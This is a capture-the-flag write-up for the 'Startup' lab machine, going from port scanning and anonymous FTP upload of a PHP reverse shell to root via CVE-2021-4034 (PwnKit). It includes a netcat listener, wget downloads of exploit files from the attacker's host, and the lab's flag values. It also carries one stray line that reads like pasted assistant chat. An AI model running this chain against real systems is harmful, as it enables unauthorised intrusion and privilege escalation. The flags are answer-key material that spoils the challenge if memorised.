# Startup CTF Write‑up

## 1. Connectivity Test

First, I verified that the target machine was reachable from my attacking machine using `ping`.

```bash
ping 10.129.153.94
```

Output:

```
PING 10.129.153.94 (10.129.153.94) 56(84) bytes of data.
64 bytes from 10.129.153.94: icmp_seq=1 ttl=62 time=180 ms
64 bytes from 10.129.153.94: icmp_seq=2 ttl=62 time=101 ms
```

The machine responded successfully, confirming that the target host was **alive and reachable**.

---

# 2. Port Scanning

Next, I scanned the target using `nmap` to identify open ports and running services.

```bash
nmap -sS -sV 10.129.153.94
```

Result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

From this scan I discovered three services:

- **FTP (21)** – vsftpd 3.0.3
    
- **SSH (22)** – OpenSSH 7.2
    
- **HTTP (80)** – Apache Web Server
    

Since a **web server** was running, I began by enumerating the website.

---

# 3. Web Enumeration

I performed directory enumeration using **ffuf** with a common wordlist.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.153.94/FUZZ
```

Important results:

```
files [Status: 301]
index.html [Status: 200]
```

The interesting discovery here was the **`/files` directory**.

---

# 4. Exploring the /files Directory

Navigating to:

```
http://10.129.153.94/files
```

I discovered a folder named **ftp**, but it did not reveal much useful information through the browser.

Since FTP was open, I decided to investigate the **FTP service** directly.

---

# 5. FTP Enumeration

I attempted to log in to the FTP service using **anonymous login**.

```bash
ftp 10.129.153.94
```

Login:

```
Name: anonymous
Password: anonymous
```

The login was successful.

Listing the files:

```
ftp> ls -la
```

Output:

```
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

I noticed a folder named **ftp**, so I entered it.

```
ftp> cd ftp
```

At this point, I noticed that the directory had **write permissions**, meaning I could upload files to it.

---

# 6. Uploading a Reverse Shell

Since I had write access to the FTP directory, I uploaded a **PHP reverse shell**.

```
ftp> put php-reverse-shell.php
```

Output:

```
226 Transfer complete.
```

Verifying the uploaded file:

```
ftp> ls
```

```
php-reverse-shell.php
```

The reverse shell file was successfully uploaded.

---

# 7. Preparing a Listener

Before triggering the shell, I started a **Netcat listener** on my machine.

```bash
nc -lvnp 4444
```

Output:

```
listening on [any] 4444 ...
```

---

# 8. Triggering the Reverse Shell

Since the FTP folder was accessible through the web server, I navigated to:

```
http://10.129.153.94/files/ftp/
```

I then clicked on:

```
php-reverse-shell.php
```

This executed the PHP file on the server and triggered the reverse shell.

---

# 9. Initial Access

My Netcat listener received the connection.

```
connect to [192.168.128.91] from [10.129.153.94]
```

System information:

```
Linux startup 4.4.0-190-generic x86_64 GNU/Linux
```

Checking the current user:

```
uid=33(www-data)
```

This confirmed that I had gained **initial access as the web server user `www-data`**.

---

Great, I’ll **continue your write‑up in the same style** so it fits perfectly with what you already wrote.

---
# 10. Stabilizing the Shell

After gaining the reverse shell, the terminal was very limited.  
To make it easier to interact with the system, I upgraded the shell using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I set the terminal type to improve command interaction:

```bash
export TERM=xterm
```

This provided a more stable shell environment for further enumeration.

---

# 11. Searching for Useful Files

While exploring the system, I discovered an interesting file named **recipe.txt**.

```bash
cat recipe.txt
```

Output:

```
Someone asked what our main ingredient to our spice soup is today.
I figured I can't keep it a secret forever and told him it was love.
```

### Answer

The secret ingredient to the spicy soup is:

```
love
```

---

# 12. Privilege Escalation Enumeration

To identify potential privilege escalation vectors, I searched for **SUID binaries**, which run with elevated privileges.

```bash
find / -perm -4000 2>/dev/null
```

The command returned several binaries including:

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
```

One binary stood out:

```
/usr/bin/pkexec
```

---

# 13. Checking pkexec Version

I checked the version of pkexec.

```bash
pkexec --version
```

Output:

```
pkexec version 0.105
```

This version is vulnerable to **CVE-2021-4034**, commonly known as **PwnKit**, which allows local privilege escalation to root.

---

# 14. Obtaining the Exploit

To exploit this vulnerability, I used a public exploit available on GitHub:

**CVE-2021-4034 exploit by ryaagard**

Repository:

```
https://github.com/ryaagard/CVE-2021-4034
```

The exploit consists mainly of:

```
evil.so
exploit
```

However, the target machine did not have the required build tools to compile the exploit.  
Therefore, I compiled it on my local machine using Docker.

Inside the container:

```bash
make
```

This generated the compiled files:

```
evil.so
exploit
```

---

# 15. Transferring the Exploit to the Target

After compiling the exploit, I copied the files from the Docker container to my local machine.

```bash
sudo docker cp ee447f32a8f6:/CVE-2021-4034/ .
```

Next, I started a simple Python web server to host the exploit files.

```bash
python3 -m http.server 8000
```

From the compromised machine, I downloaded the files using **wget**.

```bash
wget http://192.168.128.91:8000/exploit
wget http://192.168.128.91:8000/evil.so
```

---

# 16. Executing the Exploit

Before running the exploit, I made the binary executable.

```bash
chmod +x exploit
```

Then I executed it.

```bash
./exploit
```

The exploit successfully spawned a root shell.

```bash
whoami
```

Output:

```
root
```

This confirmed that the privilege escalation was successful.

---

# 17. Capturing the User Flag

Next, I navigated to the user’s home directory.

```bash
cd /home
ls
```

I found a user named **lennie**.

```bash
cd lennie
ls
```

Reading the user flag:

```bash
cat user.txt
```

Flag:

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

---

# 18. Capturing the Root Flag

Finally, I navigated to the root directory.

```bash
cd /root
ls
```

Reading the root flag:

```bash
cat root.txt
```

Flag:

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

# Conclusion

This challenge demonstrated a full attack chain including:

- Network reconnaissance
    
- Web enumeration
    
- Exploiting FTP write permissions
    
- Uploading a PHP reverse shell
    
- Gaining initial access as **www-data**
    
- Identifying vulnerable SUID binaries
    
- Exploiting **CVE-2021-4034**
    
- Escalating privileges to **root**
    

Both user and root flags were successfully obtained.

---

**Final Flags**

|Flag|Value|
|---|---|
|Spicy soup ingredient|love|
|User flag|THM{03ce3d619b80ccbfb3b7fc81e46c0e79}|
|Root flag|THM{f963aaa6a430f210222158ae15c3d76d}|
